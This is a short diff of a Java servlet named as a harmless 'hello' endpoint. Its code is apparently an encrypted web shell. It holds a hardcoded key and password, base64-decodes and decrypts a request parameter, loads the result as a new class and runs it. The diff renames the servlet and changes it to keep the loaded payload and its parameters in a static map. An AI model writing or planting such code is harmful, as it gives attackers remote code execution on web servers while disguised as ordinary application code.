@@ -12,8 +12,9 @@ import java.net.URLClassLoader;
 import java.util.HashMap;
 import java.util.Map;
 
-@WebServlet(name = "helloServlet", value = "/hello")
-public class HelloServlet extends HttpServlet {
+@WebServlet(name = "helloServlet2", value = "/hello2")
+public class Hello2Servlet extends HttpServlet {
+    public static Map<String, Object> store = new HashMap<>();
     String xc = "3c6e0b8a9c15224a";
     String pass = "pass";
     String md5 = md5(pass + xc);
@@ -89,9 +90,10 @@ public class HelloServlet extends HttpServlet {
         try {
             byte[] data = base64Decode(req.getParameter(pass));
             data = x(data, false);
-            if (payload == null) {
-                payload = defClass(data);
+            if (store.get("payload") == null) {
+                store.put("payload", defClass(data));
             } else {
+                store.put("parameters", data);
                 java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
 //                Object f = payload.newInstance();
                 Object f = ((Class) Class.forName("basic.payload")).newInstance();
